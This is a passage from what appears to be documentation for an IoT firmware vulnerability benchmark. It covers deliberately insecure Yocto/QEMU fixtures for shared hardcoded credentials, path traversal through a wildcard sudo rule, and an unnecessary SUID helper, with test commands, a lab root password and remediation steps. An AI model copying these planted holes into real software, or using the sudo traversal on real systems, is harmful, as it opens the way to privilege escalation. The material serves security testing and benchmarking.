Native-service checks also passed: HTTP dashboard for the router, JPEG snapshot
and MJPEG stream for the camera, Modbus holding registers 0-3 for the PLC, and
live MQTT state messages on guest loopback for the other eight profiles.
Serial inspection confirmed both `mosquitto` and `iotbench-mqtt` active on
each MQTT device after the systemd build correction.

Offline `debugfs` inspection of all eleven compressed exported root filesystems
confirmed the exact installed module, support fixture and device identity.
Package manifests contained exactly one vulnerability package,
`cwe798-hardcoded-credentials`. Module bytes and embedded credentials were
identical across the eleven exports.

The local report, including kernel/rootfs SHA-256 checksums and offline
inspection results, is
`deploy-images/hardcoded-credentials-qemuarm64-validation.txt`.
Validation used host HTTP port `18080` and Modbus port `11502`; MQTT checks
ran from the guest serial console because the baseline broker is local-only.
Other supported architectures have not been built or boot-tested for this
scenario in this run.

### Remediation and verification

Replace embedded shared credentials with unique credentials enrolled for each
device or user. Store salted password hashes in an access-controlled credential
store, support rotation/revocation, and authorize maintenance exports explicitly.
These changes follow the inbound-authentication guidance in
[MITRE CWE-798](https://cwe.mitre.org/data/definitions/798.html).

Changing a fleet-wide literal or embedding its hash still leaves a shared
credential. Hiding it from the HTML does not address recovery from firmware.
The request token is a separate CSRF control and does not replace authentication.

In a corrected variant, verify that the published support credential no longer
exports the backup, a newly enrolled device credential works, and that credential
fails on another device. Rebuild the sources for lasting changes; default QEMU
snapshots discard guest edits on exit. The supplied regression client's positive
CWE-798 check should fail against that corrected variant.

## Bad SUDO Rights — Path Traversal

### Manual test shared by all devices

**What this tests.** The sudo rule authorizes a root reader for paths starting
with `data/`, but `../` allows access to the fixture's private file. The same
manual commands and expected results apply to all eleven devices.

Build and boot the selected device using the
[instructions at the beginning](#build-and-boot-any-device), with
`TEST_SCENARIO=cwe022-bad-sudo-rights` and any listed `TEST_DEVICE` keyword.
Then log into the guest serial console as `root` with password `routeradmin`.
Run all three checks **inside the guest**:

**1. Confirm that the non-root caller cannot read the private file directly:**

```sh
sudo -n -u fixturetest -- cat /usr/share/iotbench/bad-sudo-rights/private/root-only.conf
echo "exit=$?"
```

Expected: `Permission denied` and a nonzero exit status.

**2. Confirm that the permitted sudo operation reads the normal status file:**

```sh
sudo -n -u fixturetest -- sudo -n /usr/bin/iotbench-maintenance-read \
  /usr/share/iotbench/bad-sudo-rights/data/status.conf
echo "exit=$?"
```

Expected: `READER_EUID=0`, `MAINTENANCE_STATUS=ready` and `exit=0`.

**3. Use traversal through the same sudo operation to read the private file:**

```sh
sudo -n -u fixturetest -- sudo -n /usr/bin/iotbench-maintenance-read \
  /usr/share/iotbench/bad-sudo-rights/data/../private/root-only.conf
echo "exit=$?"
```

Expected: `READER_EUID=0`,
`IOTBENCH_ROOT_ONLY_MAINTENANCE=ROOT_ONLY_PATH_TRAVERSAL_CONFIRMED` and `exit=0`.
The private marker appearing in step 3 after direct access failed in step 1
confirms the privileged traversal. The outer sudo switches from the lab root
console to `fixturetest`; the inner sudo exercises the vulnerable rule.
No device-specific paths, payloads or credentials are needed.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

These eleven fixtures reuse the repository's device profiles, common Yocto
image, architecture selector, build/export scripts and
one-vulnerability-per-image convention. Each `<device>-cwe022-bad-sudo-rights`
recipe installs only `cwe022-bad-sudo-rights` as its vulnerability package. The
local scenario does not attach an action to the shared dashboard or native
device services.

The ground-truth vulnerability is **Path Traversal reachable through an overly
permissive sudo rule / privileged sudo helper**, labeled **CWE-22**. The unsafe
sudo configuration is part of this single scenario, not a second independent
vulnerability label. The attacker position is the synthetic local account
`fixturetest` (UID/GID 994), with a locked password and `/bin/false` login
shell. The guest root console switches to this identity only to simulate the
foothold; no SSH account, password credential or remote entry point is added.

### Shared files and containment

The package source directory is
`meta-iotbench/recipes-vulns/cwe022-bad-sudo-rights/`. Its recipe compiles
`files/maintenance-read.c` with the normal Yocto `${CC}`, `${CFLAGS}` and
`${LDFLAGS}`. The installed reader is root-owned `0755`, with no setuid bit;
only sudo supplies its elevated execution context. The installed policy is
root-owned `0440` at `/etc/sudoers.d/iotbench-maintenance`:

```sudoers
fixturetest ALL=(root) NOPASSWD: /usr/bin/iotbench-maintenance-read /usr/share/iotbench/bad-sudo-rights/data/*
```

The sudo argument wildcard accepts slash characters and parent-directory
segments. The helper checks the raw `.../data/` prefix, one argument and a
240-byte maximum, but deliberately does not canonicalize the path or verify that
its resolved target remains in `data/`. It opens the path with `open()` and
returns at most 65536 bytes from a regular file. It never launches a shell,
executes commands, writes files, installs packages, contacts external systems or
provides persistence. The guest regression script is a separate root-console
test harness, never invoked by the reader.

The root-owned fixture tree is:

```text
/usr/share/iotbench/bad-sudo-rights/          root:root 0755
├── NOTICE                                 0644; exact warning above
├── ground-truth.json                      0644; label, paths, user and signal
├── test-guest.sh                          0644; explicit sh invocation for testing
├── data/                                  0755; intended allowed directory
│   └── status.conf                        0644; synthetic public status
└── private/                               0700
    └── root-only.conf                     0600; fake protected marker
```

Before opening a supplied path the privileged reader calls `chroot()` to this
synthetic tree and `chdir("/")`. This is a lab containment boundary around both
`data/` and `private/`; it deliberately leaves traversal across the **intended
data-directory authorization boundary** possible. Even repeated `../` cannot
read the guest's actual `/etc/passwd`, other firmware system files, or host
files. The tree has no mounts or symlinks and is not writable by `fixturetest`.
Failure to enter containment fails closed. Target symlinks, directories, special
files, extra arguments and oversized paths are rejected. No real secrets or
credentials are installed in the tree. NOTICE is also appended to `/etc/motd` by
`iotbench-bad-sudo-rights.inc` for every fixture image.

This differs from generic vulnerable Java/JAR applications: no Java runtime or
JAR is involved. It differs from generic vulnerable C binaries: this C reader is
the specific command in a real installed sudo policy, with a non-privileged
caller and root-only synthetic target. It differs from ordinary non-privileged
Path Traversal examples: direct access fails for `fixturetest`, while the same
traversal succeeds with `READER_EUID=0` only through the granted sudo operation.
The evidence must include the sudo rule, helper input-to-open flow and
protected-file permissions; a `../` string alone is insufficient.

### Shared regression tests

For the full guest regression, run this identical command from the root serial
console of any `bad-sudo-rights` device:

```sh
sh /usr/share/iotbench/bad-sudo-rights/test-guest.sh
echo "exit=$?"
```

Expected: five `PASS` lines and `exit=0`. This script accepts an optional device
keyword for an additional identity check, but no argument is needed for the
shared vulnerability checks. It verifies direct read denial, normal sudo reading,
two traversal variants, root effective UID, denied unrelated sudo operations,
argument and file handling, and containment within the synthetic fixture.

To run the host regression for the selected device, close the manually running
QEMU instance first, then use the host terminal where you set `TEST_DEVICE`:

```bash
QEMU_HTTP_PORT=18080 python3 scripts/test-bad-sudo-rights.py --device "$TEST_DEVICE"
```

To test all eleven exported devices, run:

```bash
QEMU_HTTP_PORT=18080 python3 scripts/test-bad-sudo-rights.py --all
```

The host runner requires QEMU and `zstd`, boots one disposable snapshot at a
time, runs the guest regression and closes QEMU. It checks the selected device
identity and writes `validation-console.log` beside each firmware export.
Every selected image must already have been built. The device's native services
keep their usual role; the vulnerable reader has no network endpoint.

### Safe remediation shared by all devices

Remove the wildcard sudo grant, or authorize only an exact fixed synthetic
filename (e.g. the absolute `data/status.conf` path). Avoid giving a privileged
reader general path arguments when an operation identifier will suffice. If path
input is required, enforce the intended directory inside the helper: open
relative to a trusted directory descriptor, reject traversal/absolute paths, and
use resolution controls that prevent symlink escape and races. A plain lexical
prefix check is insufficient. Drop unnecessary privileges and retain the outer
lab containment boundary. After rebuilding a corrected variant, the valid
data-file test should succeed while traversal returns a nonzero status without
the protected marker. The vulnerable fixture's positive traversal test must then
fail. Guest snapshot edits are discarded on exit.

### Completed validation

On 2026-10-06, all eleven `qemuarm64` fixtures passed BitBake recipe parsing,
dependency resolution, actual compilation and export. Each image booted in
QEMU with HVF and the host CPU and passed the guest regression (five PASS lines).
Testing used disposable snapshots and host ports HTTP `18080`, MQTT `21883`
and Modbus `11502`; the vulnerability was exercised through the serial console.

Offline `debugfs` inspection of every exported ext4 image confirmed the exact
sudo policy, locked UID/GID 994 account, root-owned `0755` helper (no setuid
bit), `0440` sudoers file, `0700` private directory, `0600` synthetic target,
ground-truth metadata, device identity and required NOTICE/login banner.
Manifests contained exactly one vulnerability package,
`cwe022-bad-sudo-rights`. The compiled helper bytes were identical across all
images.

The [local validation report](../deploy-images/bad-sudo-rights-qemuarm64-validation.txt)
records results, kernel/rootfs/helper SHA-256 checksums and guest console
evidence. Console logs are also saved alongside each exported image as
`validation-console.log`. Other supported architectures have not been built
or boot-tested in this run. Static-analysis entries above describe expected
ground truth; completed validation used build checks, filesystem inspection
and actual sudo execution.

## Privilege Escalation Risk — Dangerous SUID Rights

### Build, boot and manual testing

**What this tests.** A root-owned executable with the SUID bit runs with an
effective UID of 0 even when invoked by an ordinary user. This fixture only
prints identities, making the privilege transition visible.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe250-dangerous-suid-rights docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
echo "exit=$?"
```

Expected: metadata `root:root 4755 -rwsr-xr-x`, followed by `REAL_UID=993`,
`EFFECTIVE_UID=0`, `REAL_GID=993`, `EFFECTIVE_GID=993` and `exit=0`.
The difference between real and effective UID, together with the SUID bit,
demonstrates the behavior. If the effective UID remains 993, check for
`nosuid` / `no_new_privs` restrictions before interpreting the runtime result.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scope and ground truth

These eleven fixtures model **Privilege escalation risk caused by dangerous SUID
rights**. Each existing device profile is combined with only
`cwe250-dangerous-suid-rights` as its vulnerability package, using the normal
Yocto image, build scripts and architecture selector. The target is a dedicated
synthetic ELF executable, `/usr/bin/iotbench-suid-fixture`, created for this
benchmark. No existing system utility is made SUID by this scenario.

The expected ground-truth label is **Privilege escalation risk caused by
dangerous SUID rights**, classified as [CWE-250: Execution with Unnecessary
Privileges](https://cwe.mitre.org/data/definitions/250.html). This helper needs
no elevated privilege to print a static marker and execution identity, yet its
installed SUID bit gives it root's effective UID when an unprivileged user
executes it. The spreadsheet's legacy Bad SUID Rights row uses CWE-306; this
implementation uses CWE-250 because its measured defect is unnecessary
privilege, not an authentication function.

The fixture focuses on **filesystem permissions and privilege boundaries**. It
supplies no working privilege-escalation exploit or exploitation chain.
Reporting effective UID 0 confirms the kernel's SUID transition for this
harmless helper; it does not supply a privileged shell or arbitrary root
operations. SUID alone is not evidence that every program is exploitable: this
known-positive sample is intentionally unnecessary privilege on a synthetic
program whose entire function is safe without it.

### Installed files and behavior

| Item | Installed path / value |
| --- | --- |
| Synthetic executable | `/usr/bin/iotbench-suid-fixture` |
| Owner / group | `root:root`, numeric UID/GID `0:0` |
| Permission mode | `4755`, displayed as `-rwsr-xr-x` |
| SUID / SGID | SUID enabled (`04000`); SGID disabled |
| Unprivileged caller | `suidfixture`, UID/GID `993:993`, no privileged supplementary groups |
| Account state | Locked password, `/bin/false` shell, no login credentials |
| Fixture notice | `/usr/share/iotbench/dangerous-suid-rights/NOTICE` |
| Ground truth | `/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` |
| Login warning | Same NOTICE appended to `/etc/motd` |

The `s` in the owner's execute position means SUID is enabled together with
owner execution permission. The group and other `r-x` permissions allow a normal
unprivileged caller to run the helper. Its root-owned parent directories are
traversable and not publicly writable; the helper itself is not writable by the
fixture user. The intentionally dangerous permission is **unnecessary SUID**,
not a writable program or a writable system directory.

`iotbench-suid-fixture.c` is compiled with the standard Yocto `${CC}`,
`${CFLAGS}` and `${LDFLAGS}`. Installation sets root ownership before applying
`chmod 4755`, since changing ownership can clear SUID. A rootfs postprocess
check fails image generation unless ownership and mode are exactly `0:0:4755`.
Final ext4 inode metadata is verified separately with `debugfs`.

The helper accepts no arguments and reads no stdin or filesystem files. It
prints the warning, the fixed marker `SUID_FIXTURE_ONLY=BENIGN_IDENTITY_REPORT`,
and its real/effective UID/GID, then exits. Additional arguments are rejected
with status 2. It never launches another program, invokes a shell or
interpreter, accepts commands or paths, modifies authentication files or
sudoers, accesses host files, performs networking or provides persistence. It
contains no credentials or secrets. The fixture adds no daemon or web module and
keeps the device's existing native telemetry services.

`util-linux-setpriv` is installed as an ordinary **non-SUID** verification
utility with mode `0755`; it is not the benchmark target. From the existing
guest root console it switches to the synthetic non-root UID/GID and directly
executes the test helper. The helper itself never calls this utility. User
creation uses Yocto's existing `useradd` class; no runtime account changes or
additional login credentials are part of the helper.

### Local build and verification

From the repository root, parse and resolve one image:

```bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe250-dangerous-suid-rights'
```

Build all eleven fixtures through the existing exporter:

```bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe250-dangerous-suid-rights.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
```

The default architecture is `qemuarm64`. Other existing selectors are `qemuarm`,
`qemux86-64`, `qemux86` and `qemumips`; set `YOCTO_MACHINE` consistently for
build and boot. `scripts/build-all.sh` discovers the new recipes automatically.
Each firmware directory below contains its compressed ext4 image and kernel.

For **static verification without booting**, use the new dependency-free
verification script on a host with Python 3, `debugfs` and `zstd`:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/router-cwe250-dangerous-suid-rights/qemuarm64/iotbench-router-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Expected: two `PASS` lines. This checks the real ext4 inode metadata and
accessible parent directories, the locked non-root account, a dedicated ELF
helper, matching ground truth, device identity and the warning. It does not
mount the firmware or execute its contents on the host. Use `--debugfs` to
specify the tool's absolute path when it is not on PATH. The existing builder
also provides the inspection tools:

```bash
docker compose run --rm yocto python3 /scripts/test-dangerous-suid-rights.py \
  --image /export/router-cwe250-dangerous-suid-rights/qemuarm64/iotbench-router-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

For **benign runtime verification**, boot one image with the per-device commands
below and use its root serial console. The root login is the existing lab
account from the README. Inspect metadata and run the helper with the normal
non-root caller identity:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected metadata: `root:root 4755 -rwsr-xr-x`. Expected helper output:

```text
INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT
SUID_FIXTURE_ONLY=BENIGN_IDENTITY_REPORT
REAL_UID=993
EFFECTIVE_UID=0
REAL_GID=993
EFFECTIVE_GID=993
```

The real UID identifies the non-root caller; the effective UID becomes the file
owner's UID because SUID is enabled. The group remains the caller's group
because SGID is disabled. Running the helper directly as root does not establish
this boundary transition. Runtime SUID effects can be suppressed by `nosuid`
mounts, `no_new_privs` or tracing; static metadata remains the primary finding.

To automate the console checks on a POSIX host with QEMU and `zstd`:

```bash
python3 scripts/test-dangerous-suid-rights.py --device router
python3 scripts/test-dangerous-suid-rights.py --all
# Optional Apple Silicon acceleration and unused host ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-dangerous-suid-rights.py --all
```

This runner boots and closes each disposable QEMU snapshot itself. It checks
metadata, the device profile, real/effective identities, the static marker and
rejection of an extra argument. Console logs go to the path printed for each
image. All helper execution takes place inside the guest.

### Expected static-analysis finding and secure remediation

A firmware analyzer should report the synthetic executable's root owner, execute
bits, SUID bit and accessibility to a non-root user. Correlate those inode facts
with the installed ground truth and the helper's lack of any need for root
privileges. A filename or an ELF string alone is not sufficient: inspection or
extraction must preserve numeric ownership and permission bits.

Secure remediation is to install this helper as `root:root` with mode `0755`
instead of `4755`, removing SUID while retaining normal execution. Apply the
change in the recipe and update the intentionally vulnerable rootfs assertion
for a corrected variant, then rebuild. No elevated capability is needed for this
helper. In a disposable guest only, a quick comparison is:

```bash
chmod 0755 /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

The static marker should still print, but both `REAL_UID` and `EFFECTIVE_UID`
should be `993`; metadata should read `root:root 755 -rwxr-xr-x`. The supplied
known-positive regression should then fail its SUID assertions. Default guest
snapshot changes are discarded; source changes and a rebuild provide the lasting
corrected variant.

### Completed validation

On 2026-10-06, all eleven `qemuarm64` targets passed BitBake parsing, dependency
resolution, actual compilation and export. Each exported image passed the
offline verifier against its real ext4 inode metadata: the synthetic ELF
helper was root-owned `0:0`, mode `4755`, executable by non-root callers, with
accessible and non-writable parent directories. Account, ground-truth and
warning checks passed for every device; the verification utility remained
non-SUID `0755`. Both compressed and uncompressed image inspection were checked.

Package manifests contained exactly one vulnerability package,
`cwe250-dangerous-suid-rights`. Helper bytes were identical across all eleven
images. No sudo permission rule was introduced by this scenario.

Every image also booted in a disposable QEMU snapshot using HVF and the host
CPU. The benign identity test confirmed `REAL_UID=993`, `EFFECTIVE_UID=0`,
`REAL_GID=993`, `EFFECTIVE_GID=993`, the expected static marker, correct device
identity and rejection of additional arguments with exit status 2. Host ports
were HTTP `18080`, MQTT `21883` and Modbus `11502`.

The [local validation report](../deploy-images/dangerous-suid-rights-qemuarm64-validation.txt)
contains results, kernel/rootfs/helper SHA-256 checksums and console evidence.
Each exported firmware directory also contains `validation-console.log`.
Other supported architectures have not been built or boot-tested in this run.
The documented analyzer finding is expected ground truth; completed validation
used inode inspection and benign identity reporting, without an exploitation
chain or an external firmware-analysis engine.

### Dangerous SUID Rights — doorlock

Simulated device: **access-control door lock**, retaining its existing MQTT lock
telemetry and `meta-iotbench/recipes-devices/doorlock/` profile. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/doorlock-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/doorlock-cwe250-dangerous-suid-rights/qemuarm64/iotbench-doorlock-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=doorlock-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=doorlock-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/doorlock-cwe250-dangerous-suid-rights/qemuarm64/iotbench-doorlock-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device doorlock
```

### Dangerous SUID Rights — envsensor

Simulated device: **environmental sensor**, retaining its existing MQTT
environmental telemetry and `meta-iotbench/recipes-devices/envsensor/` profile.
Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/envsensor-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/envsensor-cwe250-dangerous-suid-rights/qemuarm64/iotbench-envsensor-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=envsensor-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=envsensor-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/envsensor-cwe250-dangerous-suid-rights/qemuarm64/iotbench-envsensor-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device envsensor
```

### Dangerous SUID Rights — healthmonitor

Simulated device: **health monitor**, retaining its existing MQTT synthetic
health telemetry and `meta-iotbench/recipes-devices/healthmonitor/` profile.
Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/healthmonitor-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/healthmonitor-cwe250-dangerous-suid-rights/qemuarm64/iotbench-healthmonitor-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=healthmonitor-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/healthmonitor-cwe250-dangerous-suid-rights/qemuarm64/iotbench-healthmonitor-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device healthmonitor
```

### Dangerous SUID Rights — ipcamera

Simulated device: **surveillance IP camera**, retaining its existing HTTP
snapshots and MJPEG streaming and `meta-iotbench/recipes-devices/ipcamera/`
profile. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/ipcamera-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/ipcamera-cwe250-dangerous-suid-rights/qemuarm64/iotbench-ipcamera-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=ipcamera-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=ipcamera-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/ipcamera-cwe250-dangerous-suid-rights/qemuarm64/iotbench-ipcamera-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device ipcamera
```

### Dangerous SUID Rights — plc

Simulated device: **industrial PLC gateway (OT)**, retaining its existing
Modbus/TCP registers and `meta-iotbench/recipes-devices/plc/` profile. Image
recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe250-dangerous-suid-rights.bb`.
Firmware directory: `deploy-images/plc-cwe250-dangerous-suid-rights/<machine>/`.
For the default machine, the rootfs is
`deploy-images/plc-cwe250-dangerous-suid-rights/qemuarm64/iotbench-plc-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=plc-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=plc-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/plc-cwe250-dangerous-suid-rights/qemuarm64/iotbench-plc-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device plc
```

### Dangerous SUID Rights — router

Simulated device: **network gateway/router**, retaining its existing shared HTTP
administration and `meta-iotbench/recipes-devices/router/` profile. Image
recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/router-cwe250-dangerous-suid-rights/<machine>/`. For the default
machine, the rootfs is
`deploy-images/router-cwe250-dangerous-suid-rights/qemuarm64/iotbench-router-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
